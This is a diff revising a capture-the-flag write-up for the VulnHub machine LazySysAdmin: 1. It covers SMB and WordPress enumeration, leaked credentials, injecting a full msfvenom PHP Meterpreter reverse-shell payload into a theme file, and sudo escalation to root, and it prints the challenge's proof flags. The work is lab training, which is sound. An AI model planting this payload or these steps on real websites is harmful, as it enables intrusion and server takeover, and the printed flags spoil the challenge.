@@ -1,46 +1,74 @@
+# LazySysAdmin: 1 — CTF Write-up
+
 ## Overview
 
 LazySysAdmin: 1 is a beginner-friendly boot-to-root CTF challenge hosted on VulnHub.
-It simulates a Linux server with security weaknesses caused by poor system administration.
-Participants must enumerate services, discover exposed information, and identify vulnerabilities.
-The ultimate goal is to gain root access to the target system.
-### Network Discovery
+
+The challenge simulates a Linux server with security weaknesses caused by poor system administration. The objective is to enumerate services, discover exposed information, identify vulnerabilities, obtain an initial shell, and ultimately gain root access to the target machine.
+## Download the Lab
+
+You can download the LazySysAdmin: 1 virtual machine from VulnHub.
+
+- **Challenge Page:** [LazySysAdmin: 1 — VulnHub](https://www.vulnhub.com/entry/lazysysadmin-1,205/)
+- **Direct Download:** [Lazysysadmin.zip](https://download.vulnhub.com/lazysysadmin/Lazysysadmin.zip)
+
+**Virtualization:** VirtualBox or VMware
+
+**Difficulty:** Beginner – Intermediate
+
+## Network Discovery
 
 Using `netdiscover`, we identified two active devices on the local network:
 
 - `192.168.43.220` — Our Kali Linux machine.
-- `192.168.43.166` — The target virtual machine (LazySysAdmin).
+- `192.168.43.166` — The LazySysAdmin target machine.
 
-The target IP address identified for further enumeration is `192.168.43.166`.
+The target IP address identified for further enumeration was `192.168.43.166`.
 
 ![Netdiscover Results](screenshots/one.png)
 
-### SMB Service Enumeration
+## SMB Service Enumeration
 
-We used Nmap with the `-sV` option to identify the services and their versions running on the target machine. The scan revealed SMB (Samba) on ports 139 and 445.
+We used Nmap with the `-sV` option to identify the services and their versions running on the target machine.
 
-SMB is a network protocol used for sharing files and resources between devices. We will investigate the SMB service to check whether any shared resources are accessible without authentication.
+The scan revealed several open ports, including ports `139` and `445`, which are commonly associated with SMB (Server Message Block).
+
+SMB is a network protocol used to share files and resources between devices. We decided to investigate this service to determine whether any shared resources were accessible without authentication.
+
+The scan also identified other services, including SSH, HTTP, MySQL, and IRC, which could be investigated during further enumeration.
+
+The following command was used:
+
+```bash
+nmap -sV 192.168.43.166
+```
 
 ![Nmap Scan Results](screenshots/2.png)
 
-### SMB Anonymous Access
+## SMB Anonymous Access
 
-We successfully connected to the SMB service without providing a password. This indicates that the service allows access without authentication. We can now explore the available shared resources.
+We investigated the SMB service and successfully connected without providing a password.
+
+This indicated that the service allowed access without authentication. We could now explore the available shared resources and look for files that might contain useful information.
 
 ![SMB Anonymous Access](screenshots/3.png)
 
-### WordPress Configuration File Discovery
+## WordPress Configuration File Discovery
 
-Using the shell we obtained, we accessed the WordPress configuration files and retrieved `wp-config.php` using the `GET` command. By examining the file contents, we discovered the following credentials:
+Using the shell we obtained, we accessed the WordPress configuration files and retrieved `wp-config.php` using the `GET` command.
+
+By examining the file contents, we discovered the following credentials:
 
 - **Username:** `Admin`
 - **Password:** `TogieMYSQL12345^^`
 
+These credentials provided a new lead for investigating access to the WordPress administration panel.
+
 ![WordPress Configuration File](screenshots/4.png)
 
-### WordPress Login
+## WordPress Login
 
-After discovering the username and password in the `wp-config.php` file, we needed to determine where these credentials could be used.
+After discovering the username and password in `wp-config.php`, we needed to determine where these credentials could be used.
 
 Using **Dirb**, we discovered the following WordPress administration URL:
 
@@ -55,24 +83,27 @@ We successfully logged in to the WordPress interface using these credentials.
 
 ![Successful WordPress Login](screenshots/login_wp.png)
 
-### WordPress Theme Editor Discovery
+## WordPress Theme Editor Discovery
 
-After exploring the WordPress dashboard, we found a file in the theme editor that appeared to be displayed when an error occurred. We also discovered that the file could be edited through the WordPress administration panel.
+After exploring the WordPress dashboard, we found that theme files could be edited through the administration panel.
 
 The theme editor was accessible at:
 
 `http://192.168.43.166/wordpress/wp-admin/theme-editor.php`
 
-This discovery led us to consider whether the ability to edit theme files could be abused to execute code on the target system. We decided to investigate this possibility in our authorized CTF lab.
+This discovery led us to investigate whether the ability to modify theme files could be abused to execute PHP code on the target system.
+
+We continued testing this possibility within the authorized CTF environment.
 
 ![WordPress Theme Editor](screenshots/editor_themes.png)
-### Generating a PHP Meterpreter Payload
 
-After discovering that WordPress allowed us to edit theme files, we decided to test whether this functionality could be used to establish a reverse connection in our authorized CTF lab.
+## Generating a PHP Meterpreter Payload
+
+After discovering that WordPress allowed us to edit theme files, we decided to test whether this functionality could be used to establish a reverse connection to our Kali Linux machine.
 
 We used `msfvenom` to generate a PHP Meterpreter reverse TCP payload. We configured our Kali Linux machine (`192.168.43.220`) as the callback address and selected port `888`.
 
-The following command was used to generate the payload:
+The following command was used:
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.220 LPORT=888 -f raw
@@ -82,7 +113,7 @@ The screenshot below shows the payload generation process.
 
 ![MSFvenom Payload Generation](screenshots/msfvenom.png)
 
-#### Generated PHP Payload
+### Generated PHP Payload
 
 The following PHP code was generated by `msfvenom`:
 
@@ -90,17 +121,17 @@ The following PHP code was generated by `msfvenom`:
 <?php /**/ error_reporting(0); $ip = '192.168.43.220'; $port = 888; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-This payload attempts to establish a TCP connection back to the configured Kali Linux machine. Generating the payload alone does not confirm that a connection has been established; execution and a properly configured listener are also required.
+This payload was configured to connect back to the specified IP address and port. Generating the payload alone did not establish a session; the payload also had to execute on the target while a compatible listener was running.
 
-### Injecting the Payload into the WordPress Theme
+## Injecting the Payload into the WordPress Theme
 
-After generating the PHP Meterpreter payload, we opened the WordPress Theme Editor and inserted the payload into the selected theme file. We then saved the changes.
+After generating the PHP Meterpreter payload, we opened the WordPress Theme Editor and inserted the payload into the selected theme file.
 
-This step was intended to test whether the modified theme file could execute the PHP payload in our authorized CTF environment.
+We then saved the changes. This step was intended to test whether the modified theme file could execute the PHP payload in our authorized CTF environment.
 
-![Payload Inserted into WordPress Theme Editor](screenshots/edited.png)
+![Payload Inserted into WordPress Theme Editor](screenshots/editor.png)
 
-### Starting the Metasploit Listener
+## Starting the Metasploit Listener
 
 Next, we launched the Metasploit Framework using `msfconsole` and configured a multi/handler to receive the reverse TCP connection.
 
@@ -121,9 +152,9 @@ Metasploit confirmed that the reverse TCP handler had started and was listening 
 
 ![Metasploit Listener](screenshots/msfconsol.png)
 
-At this point, the handler was waiting for an incoming connection. A successful session would confirm that the payload had executed and connected back to our machine.
+At this point, the handler was waiting for an incoming connection. We then requested the modified theme file to trigger the payload.
 
-### Obtaining a Shell
+## Obtaining a Shell
 
 After starting the Metasploit listener, we sent a request to the modified WordPress theme file at the following URL:
 
@@ -133,9 +164,9 @@ This triggered the PHP payload and successfully established a Meterpreter sessio
 
 ![Obtaining a Shell](screenshots/get_Shell.png)
 
-### Enumerating System Users
+## Enumerating System Users
 
-Our initial shell provided limited privileges, so the next step was to investigate the system and identify potential paths for privilege escalation.
+After obtaining an initial shell, we investigated the system to identify potential paths for privilege escalation.
 
 We used the following command to list the local user accounts:
 
@@ -145,41 +176,40 @@ cat /etc/passwd
 
 ![System User Enumeration](screenshots/passwd.png)
 
-While examining the output, we noticed an account named `togie`. This account stood out from the other entries and became a candidate for further investigation.
+While examining the output, we noticed an account named `togie`. This account stood out as a potential candidate for further investigation.
 
-At this stage, we had identified a potential target for privilege escalation, but we still needed to examine the account's permissions and available access paths before determining whether it could help us gain higher privileges.
-### Discovering Credentials Through SMB
+At this stage, we had identified a possible path to higher privileges, but we still needed to investigate the account's credentials and permissions.
 
-After identifying the `togie` user, we decided to return to the SMB service and investigate whether any shared files contained useful information.
+## Discovering Credentials Through SMB
+
+After identifying the `togie` user, we returned to the SMB service to investigate whether any shared files contained useful information.
 
 While exploring the available SMB resources, we discovered a file named `deets.txt`. We downloaded it using the following command:
 
 ```text
 smb: \> get deets.txt
+getting file \deets.txt of size 139 as deets.txt (9.0 KiloBytes/sec) (average 156.3 KiloBytes/sec)
+smb: \>
 ```
 
 The transfer completed successfully, and the file was saved locally for further inspection.
 
-![Password Discovered in deets.txt](screenshots/password.png)
+![Credentials Discovered in deets.txt](screenshots/password.png)
 
-### Privilege Escalation to Root
-
-At this point, we had discovered the credentials for the `togie` user:
+Upon examining the file, we discovered a password associated with the `togie` account:
 
 - **Username:** `togie`
 - **Password:** `12345`
 
-However, when we initially tried to switch to the `togie` user, we received the following error:
+This discovery provided the credentials needed to investigate the account and its permissions.
 
-```text
-su: must be run from a terminal
-```
+## Privilege Escalation to Root
 
-The problem was that our current shell was not attached to a proper interactive terminal.
+At this point, we had discovered the credentials for the `togie` user. However, our current shell was not attached to a proper interactive terminal, so we first needed to obtain an interactive TTY.
 
-#### Getting an Interactive TTY
+### Getting an Interactive TTY
 
-Python came to the rescue. We used the `pty` module to spawn an interactive Bash shell:
+We used Python's `pty` module to spawn an interactive Bash shell:
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -197,13 +227,13 @@ We could now switch to the `togie` user:
 su togie
 ```
 
-The system asked for the password:
+The system requested the password:
 
 ```text
 Password: 12345
 ```
 
-The login was successful:
+The login was successful, and the prompt changed to the `togie` account:
 
 ```text
 togie@LazySysAdmin:/var/www/html/wordpress/wp-content/themes/twentyfifteen$
@@ -217,13 +247,100 @@ After gaining access as `togie`, we checked which commands the user was allowed 
 sudo -l
 ```
 
-We entered the password:
+After entering the password, the system displayed the following output:
 
 ```text
 [sudo] password for togie: 12345
 
-Upon examining the file, we discovered a password:
+Matching Defaults entries for togie on LazySysAdmin:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
-- **Password:** `12345`
+User togie may run the following commands on LazySysAdmin:
+    (ALL : ALL) ALL
+```
 
-This discovery provided a new lead for investigating the `togie` account and potential privilege escalation paths.
+The critical line was:
+
+```text
+(ALL : ALL) ALL
+```
+
+This indicated that the `togie` user was permitted to execute commands as any user, including `root`. This unrestricted sudo permission provided a direct path to privilege escalation.
+
+### Getting Root Access
+
+We used the available sudo privileges to launch a root shell:
+
+```bash
+sudo su
+```
+
+The terminal prompt changed to:
+
+```text
+root@LazySysAdmin:/var/www/html/wordpress/wp-content/themes/twentyfifteen#
+```
+
+This confirmed that we had successfully obtained root privileges on the target machine.
+
+### Finding the Proof
+
+With root access established, we inspected the `/root` directory:
+
+```bash
+ls /root
+```
+
+The output revealed the following file:
+
+```text
+proof.txt
+```
+
+We then read its contents:
+
+```bash
+cat /root/proof.txt
+```
+
+The file contained the following proof and message:
+
+```text
+WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
+
+Well done :)
+
+Hope you learn't a few things along the way.
+
+Regards,
+
+Togie Mcdogie
+```
+
+The file also included several additional random strings:
+
+```text
+WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
+2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
+pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
+bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
+```
+
+These strings appeared in the original `proof.txt` file. The first string was also presented as the proof at the beginning of the file.
+
+![Root Access and Proof](screenshots/flag.png)
+
+## Final Attack Chain
+
+The complete attack path for this challenge was:
+
+**Network Discovery → Nmap Enumeration → SMB Anonymous Access → Credential Discovery → WordPress Login → Theme Editor → PHP Meterpreter Payload → Reverse Shell → Interactive TTY → `togie` Account → Sudo Enumeration → Root Access → `proof.txt`**
+
+## Conclusion
+
+The LazySysAdmin CTF demonstrated how multiple security weaknesses can be combined to compromise a vulnerable Linux system.
+
+During the challenge, we enumerated network services, discovered anonymously accessible SMB resources, recovered credentials, accessed the WordPress administration panel, and used an editable theme file to obtain an initial shell.
+
+We then investigated local user accounts, discovered credentials for `togie`, and found that the account could execute commands with unrestricted sudo privileges. This ultimately allowed us to obtain root access and read `/root/proof.txt`, completing the challenge.
